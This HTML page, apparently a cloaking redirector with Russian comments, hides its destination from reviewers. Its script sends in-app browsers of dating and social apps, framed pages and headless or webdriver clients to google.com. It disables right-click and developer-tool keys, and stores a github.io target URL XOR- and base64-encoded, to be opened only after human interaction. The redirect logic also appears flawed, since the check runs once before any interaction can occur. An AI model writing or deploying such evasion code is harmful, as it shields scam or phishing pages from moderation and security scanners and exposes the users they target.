<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="robots" content="noindex, nofollow" />
  <title>Redirecting...</title>
  <style>
    body {
      background: #000;
      color: #0f0;
      font-family: monospace;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
  </style>
</head>
<body>
  <noscript>JavaScript is required.</noscript>
  <script>
    // === Антибот: WebView и встроенные браузеры ===
    const ua = navigator.userAgent.toLowerCase();
    if (
      ua.includes("instagram") ||
      ua.includes("fbav") ||
      ua.includes("facebook") ||
      ua.includes("tinder") ||
      ua.includes("okhttp") ||
      ua.includes("webview") ||
      ua.includes("grindr") ||
      ua.includes("pinterest")
    ) {
      location.href = "https://google.com"; // пустышка
    }

    // === Антибот: Iframe check ===
    if (window.top !== window.self) {
      location.href = "https://google.com";
    }

    // === Антибот: WebDriver detection (headless) ===
    if (navigator.webdriver) {
      location.href = "https://google.com";
    }

    // === Анти-девелопер: запрет на правый клик и F12 ===
    document.addEventListener("contextmenu", e => e.preventDefault());
    document.onkeydown = e => {
      if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && e.keyCode === 73)) return false;
    };

    // === Защита: редирект только после взаимодействия ===
    let interacted = false;
    document.addEventListener("touchstart", () => interacted = true);
    document.addEventListener("mousemove", () => interacted = true);
    document.addEventListener("keypress", () => interacted = true);

    // === Декодер: XOR + base64 ===
    function decodeXorBase64(encoded, key) {
      const decoded = atob(encoded);
      return decoded.split('').map(c => String.fromCharCode(c.charCodeAt(0) ^ key)).join('');
    }

    // === Редирект: по таймеру после взаимодействия ===
    function go() {
      if (!interacted) return;
      setTimeout(() => {
        const encrypted = "IS4vvy9pbnNncHZgcSd9J3xwZT0vIHFycGJv"; // ← https://korbendss.github.io/tobexol, закодирован ключом 3
        const url = decodeXorBase64(encrypted, 3);
        window.location.href = url;
      }, 2000); // задержка 2 сек
    }

    go();
  </script>
</body>
</html>
